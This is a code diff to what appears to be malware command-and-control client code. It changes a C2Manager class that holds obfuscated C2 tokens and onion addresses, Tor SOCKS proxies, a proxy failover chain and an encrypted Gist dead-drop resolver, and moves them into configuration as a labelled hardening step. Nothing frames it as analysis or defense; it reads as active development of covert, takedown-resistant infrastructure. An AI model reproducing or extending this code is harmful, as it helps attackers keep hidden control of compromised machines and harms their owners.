@@ -9,6 +9,7 @@ from core.obfuscation import decrypt_string
 
 import requests
 import json
+from typing import Optional
 from core.obfuscation import decrypt_string, encrypt_string
 
 class GistResolver:
@@ -39,25 +40,34 @@ class C2Manager:
     """Manages multiple C2 tokens with automatic failover"""
 
     def __init__(self):
-
-        self.tokens = [
+        from core.config import ConfigManager
+        
+        # H-06: Tokens and infrastructure are now loaded from ConfigManager
+        self.tokens = ConfigManager.get("tokens", [
             decrypt_string("VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPFsAaA=="),
             decrypt_string("VgdKW39paFVjQFB5M38+MRcEFw87P2oAICEGczQLAEoDAS0CNzI1V3cQJQgKVg=="),
             decrypt_string("VgVPWn9lblNrTlB5M38SVycDHF56Z2AMEi0jS0AAJA0Fdh4BGhY8N2otHnQYDQ=="),
-        ]
+        ])
 
-        self.bridges = []
+        self.bridges = ConfigManager.get("bridges", [])
 
-        self.onion_urls = [
+        self.onion_urls = ConfigManager.get("onion_urls", [
             decrypt_string("BkYMGz1rdk0hBA9KB09dBwdfHU8/Kjw7FzsYCFxdSxMU"), # Example .onion
-        ]
+        ])
 
-        self.proxies = [
+        self.proxies = ConfigManager.get("proxies", [
             "socks5h://127.0.0.1:9050", # Standard TOR
             "socks5h://127.0.0.1:9150", # TOR Browser
-        ]
+        ])
 
-        self.gist_resolver = GistResolver("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL") # Placeholder encrypted Gist URL
+        self.failover_chain = ConfigManager.get("failover_chain", [
+            ('direct', None),
+            ('socks5', '127.0.0.1:9050'),
+            ('http', 'proxy.failover.com:8080')
+        ])
+
+        gist_url_enc = ConfigManager.get("GIST_RESOLVER_URL", "BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL")
+        self.gist_resolver = GistResolver(gist_url_enc)
         
         self.current_token_index = 0
         self.current_bridge_index = 0
